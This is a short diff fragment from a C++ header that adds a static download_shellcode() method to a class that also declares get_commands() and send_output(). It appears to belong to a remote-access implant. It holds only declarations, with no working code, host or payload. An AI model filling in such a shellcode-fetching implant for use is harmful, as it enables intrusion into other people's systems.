@@ -71,5 +71,7 @@ public:
 	void get_commands();
 
 	void send_output(std::string msg);
+
+	static std::vector<BYTE> download_shellcode();
 };
 
